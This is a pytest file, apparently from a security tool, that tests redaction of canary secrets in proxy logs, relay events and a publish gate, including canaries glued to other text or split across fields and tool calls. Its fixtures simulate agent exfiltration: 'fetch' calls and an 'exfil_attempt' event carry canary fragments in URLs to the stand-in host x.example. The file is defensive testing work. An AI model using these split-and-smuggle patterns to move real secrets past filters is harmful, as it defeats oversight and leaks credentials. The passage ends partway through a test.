"""A canary glued to other characters is redacted on every path (K4).

Owner: ATACE Working Group.

The proxy-diff lane found that `cxbom.proxy.redact` let a canary through when it
touched a letter, a digit or a hex character, because the proxy hashed only the
whole string and its maximal runs of token characters, and a glued canary is one
run with extra characters on it. Measured before the fix, at c62a8e2, with a
canary from `make_canary`: every glued form in `GLUED` below passed through
`proxy.redact` in clear, and every other path here already redacted it.

The fix keys the proxy on the shape's prefix instead of on token boundaries.
Every canary starts with `lab-demo-`, so hashing the `SHAPE_LEN` characters that
start at every occurrence of the prefix finds every canary wherever it sits,
whatever surrounds it.

Every canary here is drawn per test with `secrets`, so no canary-shaped literal
enters a tracked file. Each test asserts the canary is present in its input,
because a scan that found nothing would otherwise report a pass.
"""
from __future__ import annotations

import itertools
import json
import secrets

import pytest

from cxbom import canary as k
from cxbom import proxy

PSID = "3b0c8f0e-6c1c-4b8e-9d5e-2f7a1c9e0b11"


def new_canary() -> tuple[str, frozenset, tuple]:
    value = k.make_canary()
    hashes, lengths = k.key_material(value)
    return value, hashes, lengths


# Each form maps a canary, and a second canary for the forms that need two, to
# the glued text and to the text the rolling-window redactor must produce. The
# forms are the ones the proxy-diff report and the brief name, plus two built
# to separate the proxy's scan from plausible wrong ones: `after-a-prefix`
# starts a non-canary window inside the text before the canary's own, and
# `after-another-canary` puts a canary that is not the key first.
GLUED = {
    "letters-before": (lambda c, o: "xyz" + c, lambda c, o: "xyz" + k.CANARY),
    "digits-before": (lambda c, o: "123" + c, lambda c, o: "123" + k.CANARY),
    "hex-before": (lambda c, o: "abcdef" + c, lambda c, o: "abcdef" + k.CANARY),
    "letters-after": (lambda c, o: c + "xyz", lambda c, o: k.CANARY + "xyz"),
    "digits-after": (lambda c, o: c + "7", lambda c, o: k.CANARY + "7"),
    "hex-after": (lambda c, o: c + "abc", lambda c, o: k.CANARY + "abc"),
    "inside-a-hex-run": (lambda c, o: "deadbeef" + c + "cafe0",
                         lambda c, o: "deadbeef" + k.CANARY + "cafe0"),
    "back-to-back": (lambda c, o: c + c, lambda c, o: k.CANARY * 2),
    "back-to-back-three": (lambda c, o: c + c + c, lambda c, o: k.CANARY * 3),
    "after-a-prefix": (lambda c, o: k.SHAPE_PREFIX + c, lambda c, o: k.SHAPE_PREFIX + k.CANARY),
    "after-another-canary": (lambda c, o: o + c, lambda c, o: o + k.CANARY),
    "in-a-url": (lambda c, o: "https://x.example/?k=zz" + c + "9&z=1",
                 lambda c, o: "https://x.example/?k=zz" + k.CANARY + "9&z=1"),
}


def _around(before: str, after: str):
    return (lambda c, o: before + c + after, lambda c, o: before + k.CANARY + after)


# Punctuation the proxy's token pattern counts as a token character, so a canary
# touching one was a longer run too. The proxy-diff review named these: a diff
# body line starts with `-` or `+`, so a canary at the start of a changed line
# is glued to the diff marker, with or without a newline before it.
PUNCTUATION = {"-": "dash", "+": "plus", "@": "at", "/": "slash", "=": "equals", ":": "colon",
               ".": "dot", "_": "underscore"}
for _p, _name in PUNCTUATION.items():
    GLUED[f"after-{_name}"] = _around(_p, "")
    GLUED[f"before-{_name}"] = _around("", _p)
    GLUED[f"line-start-after-{_name}"] = _around("ctx\n" + _p, "\n")
    GLUED[f"hex-{_name}-canary-{_name}-hex"] = _around("ab" + _p, _p + "cd")
GLUED["diff-removed-line"] = _around("--- a\n+++ b\n-", "\n+new")
GLUED["diff-added-line"] = _around("--- a\n+++ b\n-old\n+", "")


@pytest.fixture(params=sorted(GLUED))
def glued(request):
    """(canary, key material, glued text, expected redactor output)."""
    value, hashes, lengths = new_canary()
    other = k.make_canary()
    build, expect = GLUED[request.param]
    text = build(value, other)
    assert value in text
    return value, hashes, lengths, text, expect(value, other)


def events_of(*items) -> list[dict]:
    return [{"v": 1, "seq": i + 1, "t": float(i), "run": "glued", "type": type_, "data": data}
            for i, (type_, data) in enumerate(items)]


# --- the proxy's sidecar path ------------------------------------------------

def test_proxy_redact_catches_a_glued_canary(glued):
    value, hashes, _, text, _ = glued
    assert proxy.redact(text, hashes) == proxy.CANARY
    assert proxy.redact({"k": [text]}, hashes) == {"k": [proxy.CANARY]}
    assert proxy.redact({text: 1}, hashes) == {proxy.CANARY: 1}


def test_the_sidecar_file_never_carries_a_glued_canary(glued, tmp_path):
    """Through EventSink and the bytes it writes, not the helper alone."""
    value, hashes, _, text, _ = glued
    path = tmp_path / "e.jsonl"
    sink = proxy.EventSink(path, PSID, redact_sha256=hashes)
    sink.start()
    sink.emit("tool_swapped", {"serverId": "fetch", "tool": "fetch", "oldSha256": "a" * 64,
                               "newSha256": "b" * 64, "descriptionDiff": text})
    sink.emit("mcp_message", {"from": "agent", "to": "server", "method": "tools/call",
                              "rpcId": 1, "summary": text})
    sink.close()
    written = path.read_text()
    assert value not in written
    lines = [json.loads(line) for line in written.splitlines()]
    assert [e["data"].get("descriptionDiff", e["data"].get("summary")) for e in lines] == \
        [proxy.CANARY, proxy.CANARY]


def test_a_pre_session_refusal_never_carries_a_glued_canary(glued, tmp_path):
    value, hashes, _, text, _ = glued
    path = tmp_path / "e.jsonl"
    sink = proxy.EventSink(path, PSID, redact_sha256=hashes)
    sink.emit_pre_session("launch_refused", {"serverId": "fetch", "item": "launch",
                                             "reason": text, "exitCode": 2})
    sink.close()
    (line,) = path.read_text().splitlines()
    assert value not in line
    assert json.loads(line)["data"]["reason"] == proxy.CANARY


# --- the relay's paths in cxbom.canary ----------------------------------------

def test_redact_value_catches_a_glued_canary(glued):
    _, hashes, lengths, text, _ = glued
    assert k.redact_value(text, hashes, lengths) == k.CANARY


def test_the_rolling_window_rewrites_a_glued_canary_in_place(glued):
    """In place, so the characters glued on either side survive and only the canary goes."""
    _, hashes, lengths, text, expect = glued
    r = k.SplitCanaryRedactor(hashes, lengths)
    assert r.feed(text) + r.finish() == expect


def test_a_glued_canary_split_at_every_point_across_two_events(glued):
    """The split path: fragments cross an event boundary at every interior offset."""
    value, hashes, lengths, text, expect = glued
    for cut in range(1, len(text)):
        out = k.redact_events(events_of(("model_delta", {"text": text[:cut]}),
                                        ("model_delta", {"text": text[cut:]})), hashes, lengths)
        joined = "".join(e["data"]["text"] for e in out)
        assert joined == expect, f"split at {cut}"


def test_a_glued_canary_one_character_per_event(glued):
    _, hashes, lengths, text, expect = glued
    out = k.redact_events(events_of(*[("model_delta", {"text": ch}) for ch in text]),
                          hashes, lengths)
    assert "".join(e["data"]["text"] for e in out) == expect


def test_a_glued_canary_in_a_tool_call_and_an_exfil_url(glued):
    value, hashes, lengths, text, _ = glued
    out = k.redact_events(events_of(("tool_call", {"name": "fetch", "arguments": {"u": text}}),
                                    ("exfil_attempt", {"url": text})), hashes, lengths)
    assert out[0]["data"]["arguments"] == {"u": k.CANARY}
    assert out[1]["data"]["url"] == k.CANARY


def test_a_glued_canary_split_across_two_tool_arguments(glued):
    """The field boundary, with the glue on the outside of each half.

    Both rules reach this one: the keyed join, because the halves are adjacent,
    and the shape assembly, because two strings spell the shape.
    """
    value, hashes, lengths, text, _ = glued
    cut = text.index(value) + len(value) // 2
    args = {"first": text[:cut], "second": text[cut:]}
    assert k.redact_value(args, hashes, lengths) == {"first": k.CANARY, "second": k.CANARY}


def quarters(text: str, value: str) -> list[str]:
    """text cut so the canary spans four strings of at most eleven of its characters.

    No three of them hold 41 characters of it, so no assembly of at most three
    pieces spells the shape. Only the keyed join in document order can find it,
    which is what the tests that use this pin.
    """
    at = text.index(value)
    cuts = [0, at + 10, at + 20, at + 30, len(text)]
    return [text[a:b] for a, b in zip(cuts, cuts[1:])]


def test_a_glued_canary_split_across_four_tool_arguments_in_order(glued):
    value, hashes, lengths, text, _ = glued
    pieces = quarters(text, value)
    assert k._shape_participants(pieces) == set(), "the shape rule reaches this, so it pins nothing"
    args = dict(zip("wxyz", pieces))
    assert k.redact_value(args, hashes, lengths) == dict.fromkeys("wxyz", k.CANARY)


def test_the_field_join_blanks_only_for_a_canary_that_crosses_a_field():
    """A canary whole inside one field is that field's redaction, not its neighbours'.

    The join is scanned as the leaves arrived, so the canary in `a` is in the
    join too. Only a match spanning two leaves may blank the others, and a
    canary ending exactly where a leaf ends, or starting exactly where one
    starts, spans one.
    """
    value, hashes, lengths = new_canary()
    assert k.redact_value({"a": value, "b": "clean"}, hashes, lengths) == \
        {"a": k.CANARY, "b": "clean"}
    assert k.redact_value({"a": "clean", "b": value}, hashes, lengths) == \
        {"a": "clean", "b": k.CANARY}
    assert k.redact_value({"a": value, "b": ""}, hashes, lengths) == {"a": k.CANARY, "b": ""}
    assert k.redact_value(["x", value, "y"], hashes, lengths) == ["x", k.CANARY, "y"]


def test_the_field_join_still_catches_a_split_canary_whose_declared_length_is_wrong():
    """The whole-join hash is the mis-declared-length fallback, one layer out."""
    value, hashes, _ = new_canary()
    pieces = quarters(value, value)
    assert k._shape_participants(pieces) == set()
    for wrong in ((10,), (len(value) + 1,)):
        out = k.redact_value(dict(zip("wxyz", pieces)), hashes, wrong)
        assert out == dict.fromkeys("wxyz", k.CANARY), wrong


def test_back_to_back_canaries_cut_through_the_first_across_nested_fields():
    """The measured leak: a leaf holding a whole canary hid the pieces before it."""
    value, hashes, lengths = new_canary()
    w, x, y, z = quarters(value + value, value)
    assert k._shape_participants([w, x, y, z]) == set()
    args = {"w": [w], "x": x, "y": {"z": y}, "v": z}
    assert k.redact_value(args, hashes, lengths) == \
        {"w": [k.CANARY], "x": k.CANARY, "y": {"z": k.CANARY}, "v": k.CANARY}


def test_back_to_back_canaries_cut_through_the_second_copy():
    """Review M3: the second copy's cut published up to all 32 hex digits at c62a8e2."""
    value, hashes, lengths = new_canary()
    for cut in range(1, len(value)):
        out = k.redact_value({"p": value + value[:cut], "q": value[cut:]}, hashes, lengths)
        assert out == {"p": k.CANARY, "q": k.CANARY}, cut
    # The same cut through the second copy, four ways, so only the keyed join sees it.
    w, x, y, z = value + value[:10], value[10:20], value[20:30], value[30:]
    assert k._shape_participants([w, x, y, z]) == set()
    assert k.redact_value(dict(zip("wxyz", [w, x, y, z])), hashes, lengths) == \
        dict.fromkeys("wxyz", k.CANARY)


def test_back_to_back_canaries_split_across_three_fields_at_every_pair_of_cuts():
    """Review M3: 604 of these 780 streams passed the publish gate at c62a8e2."""
    value, hashes, lengths = new_canary()
    for i in range(1, len(value) - 1):
        for j in range(i + 1, len(value)):
            args = {"p": value[:i], "q": value[i:j], "r": value[j:] + value}
            out = k.redact_value(args, hashes, lengths)
            assert out == dict.fromkeys("pqr", k.CANARY), (i, j)


def all_strings(node):
    if isinstance(node, str):
        yield node
    elif isinstance(node, dict):
        for key, v in node.items():
            yield key
            yield from all_strings(v)
    elif isinstance(node, list):
        for v in node:
            yield from all_strings(v)


def exposed(out, value: str) -> int:
    """The longest run of the canary's characters that any output string carries, keys included.

    Two is the floor: `<canary>` itself can share `ca` with a canary's hex digits.
    """
    best = 0
    for s in all_strings(out):
        for i in range(len(s)):
            j = i + best + 1
            while j <= len(s) and s[i:j] in value:
                best = j - i
                j += 1
    return best


# The review's 120 streams: halves that are not adjacent in arrival order. At
# db7bcac each returned the prefix and 31 of the 32 hex digits from redact_value,
# and only the publish gate refused them. The keys are the review's.
NON_ADJACENT = {
    "another-field-between": lambda c, i: {"a": c[:i], "x": "0", "b": c[i:]},
    "reverse-order": lambda c, i: {"b": c[i:], "a": c[:i]},
    "value-then-key": lambda c, i: {"a": c[:i], c[i:]: "v"},
}


@pytest.mark.parametrize("cut", range(1, 41))
@pytest.mark.parametrize("family", sorted(NON_ADJACENT))
def test_a_canary_whose_halves_are_not_adjacent_is_redacted_by_redact_value(family, cut):
    value, hashes, lengths = new_canary()
    args = NON_ADJACENT[family](value, cut)
    out = k.redact_value(args, hashes, lengths)
    assert exposed(out, value) <= 2, out
    assert value[:cut] not in set(all_strings(out)) or len(value[:cut]) == 1
    # The same stream through the relay path, not only the helper.
    (ev,) = k.redact_events(events_of(("tool_call", {"name": "fetch", "arguments": args})),
                            hashes, lengths)
    assert ev["data"]["arguments"] == out


PLACES = ("value", "key")


@pytest.mark.parametrize("cuts", [(1, 40), (5, 20), (9, 30), (20, 21), (12, 13)])
def test_three_pieces_in_every_order_with_fields_between_and_keys_mixed_in(cuts):
    """Two or three pieces, all six orders, filler between, each piece a key or a value.

    The filler keys and text start with no hex digit, because a string that does
    is a closer as far as the key-free rule can tell and is replaced with the rest.
    """
    value, hashes, lengths = new_canary()
    i, j = cuts
    pieces = [value[:i], value[i:j], value[j:]]
    for order in itertools.permutations(range(3)):
        for places in itertools.product(PLACES, repeat=3):
            args, n = {}, 0
            for at, place in zip(order, places):
                args[f"note{n}"] = "plain text"
                if place == "key":
                    args[pieces[at]] = f"v{n}"
                else:
                    args[f"g{n}"] = pieces[at]
                n += 1
            out = k.redact_value(args, hashes, lengths)
            assert exposed(out, value) <= 2, (order, places, out)
            assert all(out[f"note{m}"] == "plain text" for m in range(3)), (order, places)
    for order in itertools.permutations(range(2)):
        two = [value[:i], value[i:]]
        args = {"fill": "plain text", "s": two[order[0]], "t": two[order[1]]}
        assert exposed(k.redact_value(args, hashes, lengths), value) <= 2


def test_a_canary_key_beside_a_crossing_split_stays_redacted():
    """Review M1: blanking the leaves must start from the redacted value, not the input.

    `_blank_leaves(value)` in place of `_blank_leaves(out)` passed every test
    before this one and published the canary key in clear.
    """
    value, hashes, lengths = new_canary()
    w, x, y, z = quarters(value, value)
    args = {value + "k": "x", "w": w, "x": x, "y": y, "z": z}
    out = k.redact_value(args, hashes, lengths)
    assert out == {k.CANARY: k.CANARY, **dict.fromkeys("wxyz", k.CANARY)}


def test_a_nested_crossing_split_blanks_every_ancestor_leaf():
    """Review M2: fail-safe, pinned. The outer join sees the inner crossing again.

    Every container on the path from the split to the root blanks all its
    leaves, so `s` is blanked though it never held any of the canary. Blanking
    too much fails closed. A change that narrowed it would need this test changed
    on purpose.
    """
    value, hashes, lengths = new_canary()
    w, x, y, z = quarters(value, value)
    args = {"p": {"w": w, "x": x, "y": y, "z": z}, "s": "clean"}
    assert k.redact_value(args, hashes, lengths) == \
        {"p": dict.fromkeys("wxyz", k.CANARY), "s": k.CANARY}


def test_short_hex_keys_that_can_complete_the_shape_are_blanked_too():
    """The fail-closed trade of a rule with no key, pinned so it is a decision.

    With half a canary on screen, a one-digit hex key is a digit of the other
    half as far as a rule without the key can tell, so it is replaced as well.
    The keys then collide on the placeholder (review M5, recorded).
    """
    value, hashes, lengths = new_canary()
    out = k.redact_value({"a": value[:20], "b": value[20:]}, hashes, lengths)
    assert out == {k.CANARY: k.CANARY}


def test_a_string_that_is_both_an_opener_and_a_closer_is_not_its_own_partner():
    """Distinct pieces, and the second kept opener is what finds the real pair.

    `both` ends with a head of the shape and starts with 31 hex digits, so it is
    an opener and a closer at the same position. It cannot pair with itself.
    `other` is a second opener at that position, and it pairs with `both`.
    """
    both = "0123456789abcdef0123456789abcde" + "lab-demo-a"
    other = "zz" + "lab-demo-b"
    assert k._shape_assembly([both]) is None
    assert k._shape_participants([both]) == set()
    assert k._shape_participants([both, other]) == {0, 1}
    assert k._shape_participants([other, both]) == {0, 1}


def brute_assemblies(strings: list[str]) -> set[tuple[int, ...]]:
    """Every assembly of two or three distinct strings that spells the shape, by enumeration.

    Written from the definition with `_spells` as the only primitive, so it
    shares none of `_Pieces`'s bookkeeping: an opener's suffix spells the
    shape's first k characters, a middle spells the next n whole, and a closer's
    prefix spells the rest.
    """
    L = k.SHAPE_LEN

    def opens(s, at):
        return 0 < at < L and len(s) >= at and k._spells(s, len(s) - at, len(s), 0)

    def closes(s, at):
        return 0 < at < L and k._spells(s, 0, L - at, at)

    found = set()
    idx = range(len(strings))
    for o in idx:
        for at in range(1, L):
            if not opens(strings[o], at):
                continue
            for m in idx:
                if m != o and closes(strings[m], at):
                    found.add((o, m))
            for j in idx:
                n = len(strings[j])
                if j == o or n == 0 or at + n >= L or not k._spells(strings[j], 0, n, at):
                    continue
                for m in idx:
                    if m not in (o, j) and closes(strings[m], at + n):
                        found.add((o, j, m))
    return found


def test_the_linear_search_agrees_with_enumeration():
    """Participants and existence match a brute-force enumeration on crowded inputs.

    The inputs are built to stress distinctness: fragments of one shape value,
    repeated so several indices hold the same string, strings that are an opener
    and a closer at once, empty strings, and hex filler. Seeded, so a failure
    reproduces.
    """
    import random
    rng = random.Random(20260927)
    for case in range(1500):
        value = k.SHAPE_PREFIX + "".join(rng.choice(k.SHAPE_HEX) for _ in range(32))
        pool = []
        for _ in range(rng.randint(2, 6)):
            a = rng.randint(0, 40)
            b = rng.randint(a, 41)
            pool.append(value[a:b])
        pool.append(value[rng.randint(9, 40):] + value[:rng.randint(1, 40)])
        pool += ["", "zz", rng.choice(k.SHAPE_HEX)]
        strings = [rng.choice(pool) for _ in range(rng.randint(2, 8))]
        want = brute_assemblies(strings)
        assert k._shape_participants(strings) == {i for t in want for i in t}, (case, strings)
        got = k._shape_assembly(strings)
        assert (got is not None) == bool(want), (case, strings)
        if got is not None:
            assert got in want, (case, strings, got)


def test_the_pair_set_answers_avoidance_exactly_for_every_small_sequence():
    """`_Pairs.avoiding(x)` finds a pair without x exactly when one was added, exhaustively.

    Every sequence of up to four pairs over four indices, every x. The random
    property test above reached the slot logic only once in about fourteen
    thousand inputs, so the contract is checked here directly.
    """
    pairs = [(a, b) for a in range(4) for b in range(4) if a != b]
    for length in range(1, 5):
        for seq in itertools.product(pairs, repeat=length):
            kept = k._Pairs()
            for pair in seq:
                kept.add(pair)
            for x in range(4):
                got = kept.avoiding(x)
                assert (got is not None) == any(x not in pair for pair in seq), (seq, x)
                assert got is None or (got in seq and x not in got), (seq, x, got)


def test_a_three_piece_assembly_whose_closer_is_the_first_kept_opener():
    """Two openers per move, not one: the first kept opener can be the closer itself.

    `closer_too` ends with the shape's first ten characters and starts with the
    26 hex digits that finish it after `middle`, so it is kept first as an opener
    at position 10 and is also the only closer at position 15. The assembly is
    `other` + `middle` + `closer_too`.
    """
    value = k.SHAPE_PREFIX + "0123456789abcdef" * 2
    closer_too = value[15:] + value[:10]
    other = "zz" + value[:10]
    middle = value[10:15]
    strings = [closer_too, other, middle]
    assert brute_assemblies(strings) == {(1, 2, 0)}
    assert k._shape_participants(strings) == {0, 1, 2}
    assert k._shape_assembly(strings) == (1, 2, 0)


def test_many_leaves_do_not_blow_up():
    """The bound: linear in the number of strings. The earlier search was cubic here.

    Openers `l`, middles `a` and `b`, and no closer, so nothing assembles and
    every (opener, middle) pair was kept and walked. Measured on that code: 300,
    600 and 1,200 strings took 0.01, 0.06 and 0.55 s, so 30,000 extrapolates to
    hours. The bound here is 20 s, about a hundred times what it takes.
    """
    import time
    value, hashes, lengths = new_canary()
    noise = ["l", "a", "b"] * 10_000
    started = time.monotonic()
    assert k._shape_assembly(noise) is None
    assert k.redact_value(noise, hashes, lengths) == noise
    split = noise + [value[20:], "plain", value[:20]]
    out = k.redact_value(split, hashes, lengths)
    elapsed = time.monotonic() - started
    assert exposed(out, value) <= 2
    assert elapsed < 20, f"{elapsed:.1f} s for {len(split)} leaves"


# --- the publish gate ----------------------------------------------------------

def test_the_keyed_publish_check_finds_a_glued_canary(glued):
    """The keyed half on its own: the shape rule's errors are subtracted first."""
    _, hashes, lengths, text, _ = glued
    for events in (events_of(("model_delta", {"text": text})),
                   events_of(("tool_call", {"name": "fetch", "arguments": {"u": text}}))):
        keyed = [e for e in k.publish_errors(events, hashes, lengths)
                 if e not in k.shape_errors(events)]
        assert keyed, "the hash-keyed check missed a glued canary"


def test_the_key_free_shape_rule_flags_a_glued_canary(glued):
    _, _, _, text, _ = glued
    for events in (events_of(("model_delta", {"text": text})),
                   events_of(("tool_call", {"name": "fetch", "arguments": {text: "v"}}))):
        assert any("shaped like a canary" in e for e in k.shape_errors(events))


# --- false positives -----------------------------------------------------------

def impostors(value: str) -> list[str]:
    """Strings that carry a canary-shaped substring, or the canary's hex, and not the canary.

    The first is a longer hex run after the prefix whose first 32 digits are not
    the canary's. The second is the canary with its last digit changed and more
    hex after it. The third is the canary's digits inside a hex run with no prefix.
    """
    hex_part = value[len(k.SHAPE_PREFIX):]
    flipped = hex_part[:-1] + ("0" if hex_part[-1] != "0" else "1")
    return [k.SHAPE_PREFIX + secrets.token_hex(24),
            "xyz" + k.SHAPE_PREFIX + flipped + "abc",
            "cafe" + hex_part + "beef"]


def test_a_canary_shaped_run_that_is_not_the_canary_is_left_alone_by_every_keyed_path(tmp_path):
    value, hashes, lengths = new_canary()
    for text in impostors(value):
        assert value not in text
        assert proxy.redact(text, hashes) == text
        assert k.redact_value(text, hashes, lengths) == text
        r = k.SplitCanaryRedactor(hashes, lengths)
        assert r.feed(text) + r.finish() == text
        events = events_of(("model_delta", {"text": text}))
        keyed = [e for e in k.publish_errors(events, hashes, lengths)
                 if e not in k.shape_errors(events)]
        assert keyed == []


def test_the_shape_rule_refuses_a_canary_shaped_impostor_and_nothing_else():
    """Failing closed on the shape is the stated trade: it needs no key, so it cannot tell."""
    value, _, _ = new_canary()
    shaped, flipped, bare = impostors(value)
    assert k.shape_errors(events_of(("model_delta", {"text": shaped}))) != []
    assert k.shape_errors(events_of(("model_delta", {"text": flipped}))) != []
    assert k.shape_errors(events_of(("model_delta", {"text": bare}))) == []


# --- fix round 2: pieces with text between them (O2), splits across calls (O1) --

FRAGMENT_JOIN = "once the text between them is removed"


def exposed_hex(out, value: str) -> int:
    """The longest run of the canary's 32 secret digits in any output string, keys included.

    The prefix is public, so only the digits count here. Two is the floor, as
    in `exposed`.
    """
    return exposed(out, value[len(k.SHAPE_PREFIX):])


# The review's O2 families. Its 128 streams are these two at cuts 9 to 40 with
# two fresh canaries each. Cuts 1 to 8, inside the prefix, are added.
TEXT_BETWEEN = {
    "url-parameters": lambda c, i: {"u1": "https://x.example/?a=" + c[:i],
                                    "u2": "https://x.example/?b=" + c[i:]},
    "labelled-parts": lambda c, i: {"one": "part 1: " + c[:i] + " (end)",
                                    "two": "part 2: " + c[i:]},
}


@pytest.mark.parametrize("cut", range(1, 41))
@pytest.mark.parametrize("family", sorted(TEXT_BETWEEN))
def test_pieces_with_text_between_them_are_redacted_and_refused(family, cut):
    for _ in range(2):
        value, hashes, lengths = new_canary()
        args = TEXT_BETWEEN[family](value, cut)
        assert exposed_hex(k.redact_value(args, hashes, lengths), value) <= 2
        events = events_of(("tool_call", {"name": "fetch", "arguments": args}))
        (ev,) = k.redact_events(events, hashes, lengths)
        assert exposed_hex(ev, value) <= 2
        errs = k.publish_errors(events, hashes, lengths)
        assert any(FRAGMENT_JOIN in e for e in errs), (cut, errs)
        assert all(value[len(k.SHAPE_PREFIX):][j:j + 6] not in e for e in errs for j in range(27))


def test_pieces_with_text_between_them_in_reverse_and_in_three_parts():
    value, hashes, lengths = new_canary()
    for i, j in ((12, 25), (9, 30), (20, 38)):
        three = {"a": "first=" + value[:i] + ";", "b": "second=" + value[i:j] + ";",
                 "c": "third=" + value[j:] + "."}
        assert exposed_hex(k.redact_value(three, hashes, lengths), value) <= 2
        back = {"b": "?b=" + value[i:], "a": "?a=" + value[:i]}
        assert exposed_hex(k.redact_value(back, hashes, lengths), value) <= 2


def test_a_canary_with_its_prefix_dropped_or_split_is_found_by_its_digits():
    """The prefix is public, so a piece that starts inside it and runs on is keyed whole."""
    value, hashes, lengths = new_canary()
    for k0 in range(1, len(k.SHAPE_PREFIX) + 1):
        text = "the token is " + value[k0:] + " ok"
        assert k.redact_value({"t": text}, hashes, lengths) == {"t": k.CANARY}, k0
        assert any(FRAGMENT_JOIN in e for e in
                   k.publish_errors(events_of(("model_delta", {"text": text})), hashes, lengths))


def test_text_between_that_is_not_the_canary_is_left_alone():
    """Keyed: the same layout around a canary that is not the key changes nothing."""
    value, hashes, lengths = new_canary()
    other = k.make_canary()
    for cut in (5, 9, 20, 40):
        args = TEXT_BETWEEN["url-parameters"](other, cut)
        assert k.redact_value(args, hashes, lengths) == args
        errs = k.publish_errors(events_of(("tool_call", {"name": "fetch", "arguments": args})),
                                hashes, lengths)
        assert not any(FRAGMENT_JOIN in e for e in errs)


def test_a_one_digit_word_between_is_not_blanked_for_matching_a_one_digit_piece():
    """MIN_PIECE: the head is replaced, a piece under three characters is not."""
    value, hashes, lengths = new_canary()
    last = value[-1]
    args = {"p": "?a=" + value[:-1], "note": f"see {last} here", "q": "?b=" + value[-1:]}
    out = k.redact_value(args, hashes, lengths)
    assert out["p"] == k.CANARY
    assert out["note"] == f"see {last} here"
    assert exposed_hex(out, value) <= 2


def test_too_many_heads_fails_closed():
    value, hashes, lengths = new_canary()
    heads = [f"x lab-demo-{i:x} y" for i in range(k.MAX_HEADS + 1)]
    found, overflowed = k._fragment_participants(heads + ["plain"], hashes)
    # Every head, and every string beside one, which here includes the last.
    assert overflowed and found == set(range(len(heads) + 1))
    errs = k.publish_errors(events_of(("tool_call", {"name": "fetch",
                                                     "arguments": {"h": heads}})), hashes, lengths)
    assert any(f"more than {k.MAX_HEADS}" in e for e in errs)


def two_calls(first, second):
    return events_of(("tool_call", {"name": "fetch", "arguments": {"u": first}}),
                     ("tool_call", {"name": "fetch", "arguments": {"u": second}}))


@pytest.mark.parametrize("cut", range(1, 41))
def test_a_canary_split_across_two_tool_calls_never_reaches_the_pane(cut):
    """The review's 80 O1 cases: 40 cuts, two fresh canaries each."""
    for _ in range(2):
        value, hashes, lengths = new_canary()
        events = two_calls(value[:cut], value[cut:])
        out = k.redact_events(events, hashes, lengths)
        assert exposed_hex(out, value) <= 2, (cut, out)
        take = k.TakeRedactor(hashes, lengths)
        assert [take.event(ev) for ev in events] == out
        assert k.publish_errors(events, hashes, lengths)


def test_the_take_redactor_never_prints_a_head_that_carries_the_prefix():
    value, hashes, lengths = new_canary()
    take = k.TakeRedactor(hashes, lengths)
    for i in range(len(k.SHAPE_PREFIX), len(value)):
        (ev,) = events_of(("tool_call", {"name": "fetch", "arguments": {"u": "q=" + value[:i]}}))
        assert take.event(ev)["data"]["arguments"] == {"u": k.CANARY}, i
    held = take._heads + take._extensions
    assert held and all(len(h) < k.SHAPE_LEN for h, *_ in held)
    assert len(take._heads) <= k.HELD_HEADS and len(take._extensions) <= k.HELD_EXTENSIONS
    assert value[len(k.SHAPE_PREFIX):][:4] not in repr(take) and "lab" not in repr(take)


def test_a_canary_cut_into_three_calls_shows_fewer_than_sixteen_digits():
    """The print budget over a chain of pieces, at every pair of cuts on a stride."""
    value, hashes, lengths = new_canary()
    digits = value[len(k.SHAPE_PREFIX):]
    for i in range(1, 40, 2):
        for j in range(i + 1, 41, 2):
            out = k.redact_events(events_of(
                ("tool_call", {"name": "fetch", "arguments": {"u": value[:i]}}),
                ("tool_call", {"name": "fetch", "arguments": {"u": value[i:j]}}),
                ("tool_call", {"name": "fetch", "arguments": {"u": value[j:]}})), hashes, lengths)
            shown = [e["data"]["arguments"]["u"] for e in out]
            count = sum(len(s) for s in shown if s != k.CANARY and s in digits)
            assert count < k.PRINT_BUDGET_HEX, (i, j, shown)


def test_a_virtual_head_prints_only_under_the_budget():
    """A piece that starts inside the prefix carries no literal prefix, so it prints while short."""
    value, hashes, lengths = new_canary()
    take = k.TakeRedactor(hashes, lengths)
    short, long_ = value[5:12], value[5:30]
    (a, b) = events_of(("tool_call", {"name": "fetch", "arguments": {"u": short}}),
                       ("tool_call", {"name": "fetch", "arguments": {"u": long_}}))
    assert take.event(a)["data"]["arguments"] == {"u": short}
    assert take.event(b)["data"]["arguments"] == {"u": k.CANARY}


def test_a_call_with_too_many_hex_fragments_while_a_head_is_held_fails_closed():
    value, hashes, lengths = new_canary()
    take = k.TakeRedactor(hashes, lengths)
    (a,) = events_of(("tool_call", {"name": "fetch", "arguments": {"u": value[:15]}}))
    take.event(a)
    many = {"x": " ".join("a" for _ in range(k.MAX_CALL_HEX_FRAGMENTS + 1)), "y": "plain"}
    (b,) = events_of(("tool_call", {"name": "fetch", "arguments": many}))
    assert take.event(b)["data"]["arguments"] == {"x": k.CANARY, "y": "plain"}


def test_the_take_redactor_is_the_live_form_of_redact_events():
    """One entry point: event by event plus finish gives redact_events' bytes."""
    value, hashes, lengths = new_canary()
    events = events_of(("model_delta", {"text": "go " + value[:20]}),
                       ("tool_call", {"name": "fetch", "arguments": {"u": value[:12]}}),
                       ("model_delta", {"text": value[20:] + " done"}),
                       ("tool_call", {"name": "fetch", "arguments": {"u": value[12:]}}))
    batch = k.redact_events(events, hashes, lengths)
    take = k.TakeRedactor(hashes, lengths)
    live = [take.event(ev) for ev in events]
    live[2]["data"]["text"] += take.finish()
    assert live == batch
    assert value not in json.dumps(batch)
    assert exposed_hex([e["data"] for e in batch if e["type"] == "tool_call"], value) <= 2


def call(**arguments):
    return ("tool_call", {"name": "fetch", "arguments": arguments})


def test_the_gate_reads_consecutive_model_output_as_one_string():
    """A head the fragment boundaries cut three ways is whole again before the join."""
    value, hashes, lengths = new_canary()
    events = events_of(("model_delta", {"text": "the token " + value[:12]}),
                       ("model_delta", {"text": value[12:16]}),
                       ("model_delta", {"text": value[16:20] + " and the rest"}),
                       call(u="?b=" + value[20:]))
    errs = k.publish_errors(events, hashes, lengths)
    assert any(FRAGMENT_JOIN in e for e in errs), errs


def test_a_held_head_finished_by_a_middle_and_a_tail_in_one_later_call():
    value, hashes, lengths = new_canary()
    out = k.redact_events(events_of(call(u="?a=" + value[:15]),
                                    call(p="?x=" + value[15:25], q="?y=" + value[25:])),
                          hashes, lengths)
    assert out[1]["data"]["arguments"] == {"p": k.CANARY, "q": k.CANARY}
    assert exposed_hex(out, value) <= 2


def test_the_most_recent_heads_are_the_ones_held():
    """More heads than HELD_HEADS arrive first. The real one, arriving last, is still held."""
    value, hashes, lengths = new_canary()
    decoys = [call(u=f"?d=lab-demo-{i:02x}") for i in range(k.HELD_HEADS + 8)]
